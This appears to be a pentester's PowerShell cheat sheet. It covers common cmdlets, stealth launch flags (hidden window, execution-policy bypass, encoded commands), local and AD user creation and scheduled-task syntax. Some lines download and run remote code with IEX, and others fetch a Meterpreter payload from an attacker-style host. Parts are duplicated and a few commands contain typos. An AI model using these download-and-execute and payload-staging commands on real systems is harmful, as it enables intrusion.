# Powershell

Microsoft has a free course on Introduction to Powershell [here](https://docs.microsoft.com/en-us/learn/modules/introduction-to-powershell/) on their website. Information on [about\_Powershell.exe](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1\&viewFallbackFrom=powershell-7.2).

We can run powershell from the Start Menu by searching for it, through the command prompt by running `powershell.exe`, or through the run dialogbox(`windows key+r`) and running `powershell.exe`

In short, "PowerShell is a cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework. PowerShell runs on Windows, Linux, and macOS." There is a comprehensive document [here](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.2), on Microsoft website.

There is also a brief [Introduction to powershell](https://docs.microsoft.com/en-us/learn/modules/introduction-to-powershell/) course.

Microsoft has a free course on Introduction to Powershell [here](https://docs.microsoft.com/en-us/learn/modules/introduction-to-powershell/) on their website. Information on [about\_Powershell.exe](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1\&viewFallbackFrom=powershell-7.2).

We can run powershell from the Start Menu by searching for it, through the command prompt by running `powershell.exe`, or through the run dialogbox(`windows key+r`) and running `powershell.exe`

## Arguments

* `-NoP` OR `-NoProfile`
  * When you launch PowerShell with NoProfile parameter, it ensures to run script in default PowerShell environment and run without any Windows PowerShell profile. Does not load the Windows PowerShell profile.
  * powershell.exe -NoP
* `-NonI` OR `-NonInteractive`
  * Does not present an interactive prompt to the user.
* `-W Hidden` OR `-WindowStyle Hidden`
  * Sets the window style to Normal, Minimized, Maximized or Hidden.
* `-Exec Bypass` OR `-ExecutionPolicy Bypass`
  * Sets the default execution policy for the current session and saves it in the `$env:PSExecutionPolicyPreference` environment variable. This parameter does not change the Windows PowerShell execution policy that is set in the registry.
* `-Enc` OR `-EncodedCommand`
  * Accepts a base-64-encoded string version of a command. Use this parameter to submit commands to Windows PowerShell that require complex quotation marks or curly braces.

## Cmdlet

A cmdlet is a lightweight command that is used in the PowerShell environment. The PowerShell runtime invokes these cmdlets within the context of automation scripts that are provided at the command line. Cmdlets perform an action and typically return a Microsoft .NET object to the next command in the pipeline. A cmdlet is a single command that participates in the pipeline semantics of PowerShell. This includes binary (C#) cmdlets, advanced script functions, CDXML, and Workflows.

A cmdlet is simply a command through which you can perform an action. The two most helpful cmdlets that everyone should be aware of are:

* Get-Command
* Get-Help

Using the cmdlet ‘Get-Command’, you can find all the available cmdlets even if you do not know the exact cmdlet. For example, you want to restart a service from PowerShell, but you do not know the cmdlet. Although you can assume that it may contain the word ‘service’.

Common verbs:

* Get
* Start
* Stop
* Read
* Write
* New
* Out

Full list of approved verbs can be found [here](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7).

## Arguments

* `-NoP` OR `-NoProfile`
  * When you launch PowerShell with NoProfile parameter, it ensures to run script in default PowerShell environment and run without any Windows PowerShell profile. Does not load the Windows PowerShell profile.
  * powershell.exe -NoP
* `-NonI` OR `-NonInteractive`
  * Does not present an interactive prompt to the user.
* `-W Hidden` OR `-WindowStyle Hidden`
  * Sets the window style to Normal, Minimized, Maximized or Hidden.
* `-Exec Bypass` OR `-ExecutionPolicy Bypass`
  * Sets the default execution policy for the current session and saves it in the `$env:PSExecutionPolicyPreference` environment variable. This parameter does not change the Windows PowerShell execution policy that is set in the registry.
* `-Enc` OR `-EncodedCommand`
  * Accepts a base-64-encoded string version of a command. Use this parameter to submit commands to Windows PowerShell that require complex quotation marks or curly braces.

## Download files

`Invoke-Expression` - Evaluates or runs a specified string as a command and returns the results of the expression or command. Without `Invoke-Expression`, a string submitted at the command line is returned (echoed) unchanged.

* Invoke-WebRequest http://`(IP)`:(PORT)/(FILE) -Outfile (Outputfile)
  * Invoke-WebRequest -URI http://192.168.1.52:8000/test.txt -Outfile Downloaded.txt
* "IEX (New-Object Net.WebClient).DownloadString('URL')"
  * IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.52:8000/test.txt')

## General

**PowerShell Extensions**

* .ps1 - Executable script
* .psd1 - Details contents of the Powershell modules in a table of key/value pairs
* .psm1 - Powershell module file

## Commands

* Shows information about a cmdlet;

```
Get-Help Command-Name
```

* Get all the cmdlets installed on the current Computer. This cmdlet allows for pattern matching such as `Get-Command Verb-*` or `Get-Command *-Noun`

```
Get-Command
```

* `The Pipe( | )` - Used to pass output from one cmdlet to another.

```
Verb-Noun | Get-Member
```

* Make a request to a webserver. Sends HTTP and HTTPS requests to a web page or web service. It parses the response and returns collections of links, images, and other significant HTML elements. More info can be found [here](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2).

```
Invoke-WebRequest -URI http://(IP):(PORT)/(FILE) -Outfile (FILE)
```

\`

```
Invoke-WebRequest "http://10.0.2.8/meterpreter-64.ps1" -Outfile "meterpreter.ps1"
```

```
(New-Object System.Net.WebClient)DownloadFile('URL/File', 'Output-File')
```

```
(New-Object System.Net.WebClient)DownloadFile('http://10.0.2.8/meterpreter-64.ps1', 'meterpreter.ps1')
```

* Enumerate already installed patches

```
Get-Hotfix
```

```
Get-Hotfix | Format-list | findstr InstalledOn
```

```
Get-Hotfix | Format-Table HotFixID
```

* Gather more information about objects

```
Format-List
```

```
dir | Format-List
```

* Save the output to a file for further use

```
Out-File
```

```
Get-Hotfix | Out-File Hotfixes.txt
```

* Start a process, such as notepad.

```
Start-Process PROCESSNAME
```

* List all running processes. Can also be used with the `-name` parameter to filter for a specific process

```
Get-Process
```

* Export the Previously piped command into a .CSV file that may be easier to read.

```
(command) | Export-Csv
```

* Displays the content within a file or object. Similar to the `cat` command on linux.

```
Get-Content FILE
```

* Get the hash of a specified file

```
Get-FileHash
```

* Show files in current directory

```
dir
```

* Show hidden files in current directory

```
dir /A:H
```

* Retrieve an object

```
Get-Item
```

* Lists out the content of a folder or registry hive.

```
Get-ChildItem
```

* Create new objects.

```
New-Item
```

* Modify the property values of an object.

```
Set-Item
```

* Copy Item

```
Copy-Item
```

* Rename item

```
Rename-Item
```

* Delete item

```
Remove-Item
```

* Append content to a file.

```
Add-Content
```

* Overwrite any content in a file with new data.

```
Set-Content
```

* Clear the content of the files without deleting the file itself.

```
Clear-Content
```

* Compare two or more objects against each other. This includes the object itself and the content within.

```
Compare-Object
```

* List Domain Controllers

```
netdom query DC
```

* View command history

```
Get-Histtory # Powershell
doskey /history # CMD
```

* Listing the Contents of the File System

```
tree
```

* Listing the Contents of the File System with files

```
tree /F
```

* View file contents

```
Get-Contents FILE
```

* General system info

```
systeminfo
```

* See hosts that have come into contact with our machine

```
arp /a
```

* View current privileges of our user

```
whoami /priv
```

* View groups our user is in

```
whoami /groups
```

* View all active services

```
sc query type= service
```

* Stop a service

```
sc stop SERVICE
```

* Start a service

```
sc start SERVICE
```

* See available modules

```
Get-Module -ListAvailable
```

* Import a module

```
Import-Module .\FILE
```

* View Execution Policy

```
Get-ExecutionPolicy 
```

* Change Execution Polixy

```
Set-ExecutionPolicy undefined/restricted/unrestricted/
```

* View Local Groups

```
get-localgroup
```

* View Local Users

```
Get-LocalUser
```

* Adding a new user

```
New-LocalUser -Name "USERNAME" -NoPassword
```

* Add password to new user

```
$Password = Read-Host -AsSecureString
Set-LocalUser -Name "USERNAME" -Password $Password -Description "DESCRIPTION"
```

* Add user to local group

```
Add-LocalGroupMember -Group "GROUP" -Member "USERNAME"
```

* Download file

```
Invoke-WebRequest -Uri "URL" -OutFile "/path/FILENAME"
(New-Object Net.WebClient).DownloadFile("URL, "/path/FILENAME")
```

## AD-Module

* List AD Users

```
Get-ADUser -Filter *
Get-ADUser -Identity USERNAME
```

* Add new AD user

```
New-ADUser -Name "USERNAME" -Surname "LASTAME" -GivenName "FIRSTNAME" -Office "Security" -OtherAttributes @{'mail'="USERNAME@DOMAIN"} -Accountpassword (Read-Host -AsSecureString "AccountPassword") -Enabled $true 
```

## Scheduled Tasks

* View currently scheduled tasks

```
SCHTASKS /Query /V /FO list
```

* Create Syntax

| **Action**                                                                                            | **Parameter** | **Description**                                                                                                               |
| ----------------------------------------------------------------------------------------------------- | ------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| `Create`                                                                                              |               | Schedules a task to run.                                                                                                      |
|                                                                                                       | /sc           | Sets the schedule type. It can be by the minute, hourly, weekly, and much more. Be sure to check the options parameters.      |
|                                                                                                       | /tn           | Sets the name for the task we are building. Each task must have a unique name.                                                |
|                                                                                                       | /tr           | Sets the trigger and task that should be run. This can be an executable, script, or batch file.                               |
|                                                                                                       | /s            | Specify the host to run on, much like in Query.                                                                               |
|                                                                                                       | /u            | Specifies the local user or domain user to utilize                                                                            |
|                                                                                                       | /p            | Sets the Password of the user-specified.                                                                                      |
|                                                                                                       | /mo           | Allows us to set a modifier to run within our set schedule. For example, every 5 hours every other day.                       |
|                                                                                                       | /rl           | Allows us to limit the privileges of the task. Options here are `limited` access and `Highest`. Limited is the default value. |
|                                                                                                       | /z            | Will set the task to be deleted after completion of its actions.                                                              |
| Creating a new scheduled task is pretty straightforward. At a minimum, we must specify the following: |               |                                                                                                                               |

* `/create` : to tell it what we are doing
* `/sc` : we must set a schedule
* `/tn` : we must set the name
* `/tr` : we must give it an action to take
* Change Syntax

| **Action** | **Parameter** | **Description**                                    |
| ---------- | ------------- | -------------------------------------------------- |
| `Change`   |               | Allows for modifying existing scheduled tasks.     |
|            | /tn           | Designates the task to change                      |
|            | /tr           | Modifies the program or action that the task runs. |
|            | /ENABLE       | Change the state of the task to Enabled.           |
|            | /DISABLE      | Change the state of the task to Disabled.          |

* Delete Syntax

| **Action** | **Parameter** | **Description**                                           |
| ---------- | ------------- | --------------------------------------------------------- |
| `Delete`   |               | Remove a task from the schedule                           |
|            | /tn           | Identifies the task to delete.                            |
|            | /s            | Specifies the name or IP address to delete the task from. |
|            | /u            | Specifies the user to run the task as.                    |
|            | /p            | Specifies the password to run the task as.                |
|            | /f            | Stops the confirmation warning.                           |

## Additional resources

[TryHackMe Hacking With Powershell](https://tryhackme.com/room/powershell)

[TryHackme Powershell](https://tryhackme.com/room/powershellforpentesters)
